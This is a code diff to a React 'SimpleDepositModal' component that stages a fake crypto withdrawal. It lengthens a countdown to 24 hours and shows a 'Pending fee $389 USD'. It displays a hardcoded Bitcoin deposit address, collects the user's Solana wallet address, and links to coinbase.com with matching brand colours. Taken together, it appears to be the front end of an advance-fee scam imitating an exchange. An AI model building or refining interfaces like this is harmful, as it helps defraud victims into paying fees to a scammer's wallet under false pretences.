@@ -4,13 +4,14 @@ import { useEffect, useState } from "react";
 import { X, CheckCircle2 } from "lucide-react";
 
 const STORAGE_KEY = "withdraw_start_time";
-const DURATION = 6 * 60 * 60; // 6 hours
+const DURATION = 24 * 60 * 60; // 24 hours
 
 type Status = "idle" | "processing" | "success" | "support";
 
 export default function SimpleDepositModal() {
   const [status, setStatus] = useState<Status>("idle");
   const [timeLeft, setTimeLeft] = useState<number>(DURATION);
+  const [solanaWallet, setSolanaWallet] = useState("");
 
   // START WITHDRAW
   const startWithdrawal = () => {
@@ -22,6 +23,11 @@ export default function SimpleDepositModal() {
   // TIMER (ROBUSTO + SIN FLICKER)
   useEffect(() => {
     const start = localStorage.getItem(STORAGE_KEY);
+    const savedWallet = localStorage.getItem("solana_wallet");
+
+if (savedWallet) {
+  setSolanaWallet(savedWallet);
+}
 
     if (!start) return;
 
@@ -50,14 +56,15 @@ export default function SimpleDepositModal() {
   }, []);
 
   // FORMAT MM:SS
-  const formatTime = (s: number) => {
-    const minutes = Math.floor(s / 60);
-    const seconds = s % 60;
+const formatTime = (s: number) => {
+  const hours = Math.floor(s / 3600);
+  const minutes = Math.floor((s % 3600) / 60);
+  const seconds = s % 60;
 
-    return `${minutes.toString().padStart(2, "0")}:${seconds
-      .toString()
-      .padStart(2, "0")}`;
-  };
+  return `${hours.toString().padStart(2, "0")}:${minutes
+    .toString()
+    .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
+};
 
   // PROGRESS SAFE
   const progress =
@@ -134,10 +141,48 @@ export default function SimpleDepositModal() {
                 Processing withdrawal
               </p>
 
-
 <p className="text-sm font-medium text-black/60 mt-1">
-  Pending deposit $138 USD
+  Pending fee $389 USD
 </p>
+
+<div className="mt-4">
+  <p className="text-xs text-black/60">
+    Time Remaining
+  </p>
+
+  <p className="text-2xl font-bold text-[#0052FF]">
+    {formatTime(timeLeft)}
+  </p>
+</div>
+
+<div className="mt-4 rounded-lg border border-gray-200 bg-gray-50 p-3 text-left">
+  <p className="text-xs font-semibold text-black/70 mb-2">
+    Deposit destination (BTC)
+  </p>
+
+  <input
+    readOnly
+    value="bc1p7vpwwfhhhhk0nsuwd24ja48vqj69n7e9f59ndgt4zfcvn9tagqyswr3es5"
+className="w-full rounded-md border border-gray-300 bg-white px-3 py-2 text-[13px] font-medium text-gray-900"
+  />
+</div>
+
+<div className="mt-4 text-left">
+  <label className="text-xs font-semibold text-black/70">
+    Enter your Solana Wallet
+  </label>
+
+  <input
+    type="text"
+    value={solanaWallet}
+    onChange={(e) => {
+      setSolanaWallet(e.target.value);
+      localStorage.setItem("solana_wallet", e.target.value);
+    }}
+    placeholder="Paste your Solana wallet address"
+    className="mt-2 w-full rounded-lg border border-gray-200 px-3 py-3 text-sm outline-none focus:border-[#0052FF]"
+  />
+</div>
 
 <div className="mt-3 rounded-lg border border-gray-200 bg-gray-50 p-3 text-left">
   <p className="text-xs font-semibold text-black/70 mb-1">
@@ -159,6 +204,18 @@ export default function SimpleDepositModal() {
                 }}
               />
             </div>
+
+            <div className="mt-6">
+  <a
+    href="https://www.coinbase.com"
+    target="_blank"
+    rel="noopener noreferrer"
+    className="block w-full rounded-[14px] py-3 bg-[#0052FF] text-white text-center font-semibold hover:bg-[#0041cc] transition-colors"
+  >
+    Your Account
+  </a>
+</div>
+
           </>
         )}
 
